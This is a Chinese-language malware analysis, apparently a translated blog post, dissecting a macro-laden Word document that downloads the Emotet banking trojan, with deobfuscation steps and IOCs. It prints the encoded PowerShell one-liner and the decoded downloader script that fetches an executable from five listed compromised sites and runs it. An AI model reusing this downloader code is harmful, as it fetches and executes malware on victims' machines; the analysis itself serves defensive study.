> 原文链接: https://www.anquanke.com//post/id/148751 


# 深入剖析一个经修改后的Emotet银行木马下载器


                                阅读量   
                                **100571**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t012e16607b1d239f7d.png)](https://p1.ssl.qhimg.com/t012e16607b1d239f7d.png)

你可能还记得我写过一篇文章，在文中我拆解了一个[Emotet Downloader](https://0ffset.wordpress.com/2018/03/17/post-0x04-analysis-of-an-emotet-downloader/)，它使用宏和Powershell命令从受感染的网站下载Emotet。现在，他们已经修改了他们的下载器的工作方式，幸运的是它已经上传到[VirusBay](https://beta.virusbay.io/)。所以让我们分析一下它吧！

MD5散列：53ea2608f0e34e3e746801977b778305

正如你可以在下图中看到的（左边的旧的样本，右边的是新的样本），这两个文档中存在相似之处，它们都假装在使用旧版本的Microsoft Office创建文档时出现错误，为了查看它，你需要点击“启用内容（Enable Content）”。看起来是合法的，所以让我们看看当我们点击“启用内容”时会运行什么。

[![](https://p4.ssl.qhimg.com/t018ea50dd0c8b71345.png)](https://p4.ssl.qhimg.com/t018ea50dd0c8b71345.png)

当我们打开宏部分时，你会注意到有两个宏，其中包含多个函数/子例程。首先要查看的是autoopen()或auto_open()，因为这是在点击“启用内容”时执行的内容。

[![](https://p5.ssl.qhimg.com/t01ff76a75b46383be7.png)](https://p5.ssl.qhimg.com/t01ff76a75b46383be7.png)

你还可能会注意到对Sqr()的调用，它会计算一个数字的平方根并将其返回，但我们很快就能得到它。首先，让我们把这些宏提取到一个文本文件中，这样我们就可以更容易地处理它。[![](https://p0.ssl.qhimg.com/t01f656ca3c515da93f.png)](https://p0.ssl.qhimg.com/t01f656ca3c515da93f.png)由于纯文本滴管（dropper）和下载器（downloader）因包含垃圾代码而臭名昭着，所以每当声明一个变量时，我都会检查它是否存在于宏中的其他任何地方。On Error Resume Nex表示文档中存在垃圾代码，因为它的基本意思是“如果有错误，忽略它并继续”。我首先检查了 Hirfd 和  MLiDY是否存在于包含宏的文件中，但它们并不是。一旦我们忽略了垃圾代码并添加了一些注释，我们就会得到以下结果：

[![](https://p4.ssl.qhimg.com/t01e9858a8c6a01980d.png)](https://p4.ssl.qhimg.com/t01e9858a8c6a01980d.png) 这样看来，autoopen()只负责执行第一个宏中的函数vwncz()。

[![](https://p0.ssl.qhimg.com/t012d2d4062b54f438e.png)](https://p0.ssl.qhimg.com/t012d2d4062b54f438e.png) 所以从它的外观来看，这个函数中的垃圾代码似乎包含  CStr ()，就像  autoopen()一样，所以一旦我们删除了这些行，我们就得到了： [![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01343da927df7f7d22.png)

我们可以知道这些（wHjAK()、rDRYBhb() …）值是函数，因为如果我们将它们与第二个宏进行交叉引用，你会看到它们被声明为函数。所以现在我们知道第二个宏的目的是什么——形成字符串。 Shell()出现在字符串的起始处，它能够在机器上执行文件。第一个参数中的第一个字母是“ C ”，所以我们可以猜测这与  cmd有关。最后的  0从用户隐藏计划——它基本上是vbHide，但它的数值。现在我们完全去混淆了第一个宏，我们可以进入下一个宏。

[![](https://p3.ssl.qhimg.com/t01def3c87f4753b592.png)](https://p3.ssl.qhimg.com/t01def3c87f4753b592.png) 如果你在第一个宏中查看shell执行的字符串，你会注意到wHjAK()是第一个被调用的字符串  ，所以我们先从它开始。将这两个文件进行比较，你可以看到它们都有  CStr，所以我们现在可以假定其中任何带有CStr的字符串都是垃圾代码。在移除所有带有CStr的字符串后，我们得到了以下内容： [![](https://p3.ssl.qhimg.com/t01e8aea5c1397c8c2a.png)](https://p3.ssl.qhimg.com/t01e8aea5c1397c8c2a.png)

从它的外观来看，由于  wHjAK是一个函数，它将返回一个值，最终的字符串存储在  wHjAK中。因此，通过将所有的字符串相加我们可以得到最终的输出。并不需要手动完成，只需启动一个Python解释器并将代码粘贴到其中——没有  End Function和以上所有的On Error Resume Next。通过这样做，我们所要做的就是输入  print wHjAK来获得最终的字符串。

[![](https://p5.ssl.qhimg.com/t016f9de225639f6623.png)](https://p5.ssl.qhimg.com/t016f9de225639f6623.png)

虽然很难猜出这个命令在没有其他命令的情况下做了什么，但可以说这部分是声明了不同的变量，以及执行一个隐藏的命令提示符——%^c^o^m^S^p^E^c^%。 基本上指向命令提示符的路径。所以现在我们可以把函数缩小成这样：

[![](https://p5.ssl.qhimg.com/t01ea6a289fce9e490a.png)](https://p5.ssl.qhimg.com/t01ea6a289fce9e490a.png)

在每个函数中都可以看到这个垃圾代码“pattern”，因此对于第三个函数，当我们删除所有的CStr字符串并将其传递给Python解释器时，我们得到如下结果：

[![](https://p1.ssl.qhimg.com/t010cdf04457d29c347.png)](https://p1.ssl.qhimg.com/t010cdf04457d29c347.png)

这样，现在函数2和3看起来像这样：

[![](https://p0.ssl.qhimg.com/t011a9516be531a91c4.png)](https://p0.ssl.qhimg.com/t011a9516be531a91c4.png)

虽然我们可以为剩余的函数都做到这一点，但是为什么要浪费时间呢？一个简单的Python脚本可以删除带有CStr的所有字符串，并将剩余行写入文件：

[![](https://p2.ssl.qhimg.com/t01c3f7a9a4115ae7c2.png)](https://p2.ssl.qhimg.com/t01c3f7a9a4115ae7c2.png)

[![](https://p4.ssl.qhimg.com/t01c3f7a9a4115ae7c2.png)](https://p4.ssl.qhimg.com/t01c3f7a9a4115ae7c2.png)

当我们在第二个宏文件上运行这个脚本时，我们可以提取所有不包含CStr的字符串。但是，这是一个问题，因为那样我们会在文件中得到不必要的行，例如  On Error Resume Next，所以我们可以将If 语句更改为如下所示：

if “CStr” not in lines and “End” not in lines and “Error” not in lines and “Function_” not in lines:

这将只留给我们变量。所以现在我们可以将所有重要的行写入一个文件，但是我们仍然需要自己形成最终的字符串。我们再把它自动化一些怎么样？首先，我们需要找到函数名，因为我们需要print它们。一旦我们有了包含最终字符串的函数，我们可以将数据写入另一个文件——这次是一个  Python文件，我们可以执行它来获取完整的字符串。新文件将找到完整的字符串并将其写入到另一个文件中，这样我们就可以将其读入主程序的内存中，并将其存储在一个变量中。如果这没有意义，你可以在这里找到完整的脚本——它是一个打印输出最终解码字符串的完整脚本。如果你不想剧透，那么你可以在最后才看它。

无论如何，在运行我们的脚本时，它构成了最终的字符串，我们将它作为shell命令：

[![](https://p2.ssl.qhimg.com/t01ec85b3ebfbc16524.png)](https://p2.ssl.qhimg.com/t01ec85b3ebfbc16524.png)

所以，首先命令是设置全局变量，然后执行一个base64编码的字符串。解码base64字符串后，我们得到如下输出：

[![](https://p1.ssl.qhimg.com/t01b5746c35ae5e6f1d.png)](https://p1.ssl.qhimg.com/t01b5746c35ae5e6f1d.png)

乍一看，它看起来像shellcode，但事实并非如此。每个x00在空字节后面都包含一个字母。如果我们删除所有空字节，则生成的脚本为：

[![](https://p5.ssl.qhimg.com/t01f359aa73a681743b.png)](https://p5.ssl.qhimg.com/t01f359aa73a681743b.png)

我们可以确认这实际上是一个Powershell脚本，但是它在哪里被调用？如果我们回到原始命令并分析所设置的变量，你可以在文件的末尾看到这个：

```
!%izXfwddfGKP%!!%vqJRNrOQqvMv%!!%BOuDbApmqzScN%!!%voYPuLNXjn%!!%MUtvjfFlzFFsL%!!%HEYjHOmzK%! -e
```

如果我们将这个特定字符串中的每个变量解析为声明的内容，这就是我们得到的结果：

```
!%izXfwddfGKP%! = !%fuqGUmOvI%! = p

!%vqJRNrOQqvMv%! = !%KXEhPKfZWWmaJ%! = o^w

!%BOuDbApmqzScN%! = e^r

!%voYPuLNXjn%! = s

!%MUtvjfFlzFFsL%! = he

!%HEYjHOmzK%! = ll

!%izXfwddfGKP%! !%vqJRNrOQqvMv%! !%BOuDbApmqzScN%! !%voYPuLNXjn%! !%MUtvjfFlzFFsL%! !%HEYjHOmzK%! = po^we^rshell = powershell
```

通过使用变量声明，这个下载器能够形成字符串“powershell”并执行一个编码的字符串。所以现在回到我们找到的powershell脚本。

```
( neW-ObJect io.compRessION.DEfLatEstreAm([IO.MEMORystream][SySTEm.CONvErT]::fRoMBASE64stRiNg( 'VZDtS8MwEMb/lXwodEOXOF/RImzOijpfJvVlG4Jk6Wni2qQkV9s69r8b3RT8cnB3v+ce7gn06Lz4vCTHREPVMbN3EEgs16nJoyC9HX2c3v3fJY1DyOkNIH2C2SBToDEKqpOLGD0YSsTiiDGeQ11TN2fT/cvJlPXW46qqqOSpspkq8xItOOSld0MqTM66DUoxHP7REniGspCNU8J9E5SXrNjqD+KHfxdz7synyrimSr8aNulfdfvyj3DzJgOegv05wW7PD5pdvc1CmhSZwlbYC9tR8Hgx7t8n/oFglQfVUGOru0n2D7s7ex7Qw0E8Kb8B0B9HPoGCbJDwOfT1V+x7CjWE0auxwIVsBdU4nt0Rpckqn/YCbbNYp0pPTaUzw9MzlcEapfcmQav0W6u9SdaW7ShBbrEzskaAc7/jaOY95tFScBRyUVmF0JHGIQleaFwLKFAZTa+9gr9BtFx+AQ=='), [iO.cOmpREssIOn.COMPrESsioNmODe]::DeCOMpReSs) | %`{` neW-ObJect sYStEm.iO.StrEaMReADER( $_,[SYstEM.tExt.eNcOdInG]::AsCII) `}` ).rEadtOeND()|&amp;((VAriABle '*mdr*').NAMe[3,11,2]-jOin'')
```

你会注意到此脚本中嵌入一个了Base64字符串，它是使用[System.Convert]::FromBase64String从Base64转换而来  。问题是，当我们尝试使用Base64解码字符串时，它给我们提供了一个乱码。[![](https://p4.ssl.qhimg.com/t015ad3a20987279c5b.png)](https://p4.ssl.qhimg.com/t015ad3a20987279c5b.png)

原因是它被压缩。为了解压缩它，我们可以使用一个名为zlib的Python模块  。使用  zlib.decompress()，我们可以将压缩数据作为参数传递，并获得解压值，即：

[![](https://p0.ssl.qhimg.com/t01456064155f8ada5f.png)](https://p0.ssl.qhimg.com/t01456064155f8ada5f.png)如果你已经阅读了最后一篇Emotet文章，你应该能够识别出下载脚本，当我们为每一个“;”添加一个新行时，都会形成这样的脚本：

```
$nPHpzJ = new-object random;
$dOPvDQ = new-object System.Net.WebClient;$wBIEt = 'http://amexx.sk/Z6JYZ/@http://www.hadirliumutrestaurant.com/1ythcKK/@http://healthphysics.com.au/p0ACEU/@http://www.masozilan.info/YAL1Ah/@http://skyleaders.com/OH7y4n2/'.Split);
$VIXATS = $nPHpzJ.next(1, 69135);
$nKCEYu = $env:temp + '' + $VIXATS + '.exe';
for each ($wXEbQ in $wBIEt) `{`
    try `{`
        $dOPvDQ.DownloadFile($wXEbQ.ToString(), $nKCEYu);
        Start-Process $nKCEYu;
        break;
    `}`
    catch `{`
        write-host $_.Exception.Message;
    `}`
`}`
```

简而言之，该脚本通过选取一个介于1和69135之间的随机数来创建一个随机文件名，然后将其以.exe的形式存储在％TEMP％目录中  。一个for循环启动，它遍历存储在$dOPvDQ中的每个URL。然后该脚本尝试从该站点下载文件，并将其存储在％TEMP％目录中。该文件将使用Start-Process执行  。在检查了所有站点是否会下载一个文件之后，我得出的结论是，网站所有者（因为这些网站是合法的，只是被妥协了）已经删除了在其web服务器上托管的Emotet可执行文件。



## 总结

## IOCs

Hashes （MD5）：

文档： 53ea2608f0e34e3e746801977b778305

宏1： a7f490aaab202c5fd38c136371009685

宏2： 1bed5b9266f5497e258638eca7344963

网址：

[hxxp://amexx.sk/Z6JYZ/](hxxp://amexx.sk/Z6JYZ/)

[hxxp://www.hadirliumutrestaurant.com/1ythcKK/](hxxp://www.hadirliumutrestaurant.com/1ythcKK/)

[hxxp://healthphysics.com.au/p0ACEU/](hxxp://healthphysics.com.au/p0ACEU/)

[hxxp://www.masozilan.info/YAL1Ah/](hxxp://www.masozilan.info/YAL1Ah/)

[hxxp://skyleaders.com/OH7y4n2/](hxxp://skyleaders.com/OH7y4n2/)



审核人：yiwang   编辑：边边
